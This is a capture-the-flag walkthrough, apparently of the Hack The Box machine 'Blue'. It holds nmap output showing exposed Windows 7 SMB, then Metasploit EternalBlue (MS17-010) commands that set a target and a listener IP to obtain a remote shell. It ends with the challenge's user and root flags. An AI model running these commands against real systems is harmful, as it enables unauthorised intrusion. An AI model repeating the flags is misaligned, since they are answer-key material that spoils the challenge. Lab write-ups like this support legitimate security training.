### IP
`10.10.10.40`

# Recon
`nmap -sC -sV 10.10.10.40 -o Blue.nmap`

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-18 22:35 EST
Nmap scan report for 10.10.10.40
Host is up (0.053s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3m27s, deviation: 2s, median: 3m26s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-11-19T03:40:32+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-19T03:40:29
|_  start_date: 2020-11-19T03:38:32

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.57 seconds
```
* We have smb running on ports 139 and 445
	* I'm guessing this is where we have to exploit, because the machine is called "Blue", likely based on the [Eternal Blue](https://en.wikipedia.org/wiki/EternalBlue) exploit
* Looks like a bunch of RPC services are running. Based on the [microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page), I'm not sure if this is too much of a big deal. We can look into that later


# Exploitation

### smb

* Let's open `msfconsole`
* `search eternal` gives us a list of options
* we type `use exploit/windows/smb/ms17_010_eternalblue` because we know from the nmap that the system is windows 7
* `show options` 
* `set RHOST 10.10.10.40`
* `set LHOST 10.10.14.19`
	* note that this ip will depend on your local ip (mine was on the vpn tun0 interface)
* `run`
	* if this doesn't work, write `set ForceExploit true` and `run` again
* we get a shell!

* When we go to `C:\Users\haris\Desktop` and run `cat user.txt` we get the user flag: `4c546aea7dbee75cbd71de245c8deea9`
* We can do the same at `C:\Users\Administrator\Desktop` to get the root flag: `ff548eb71e920ff6c08843ce9df4e717`

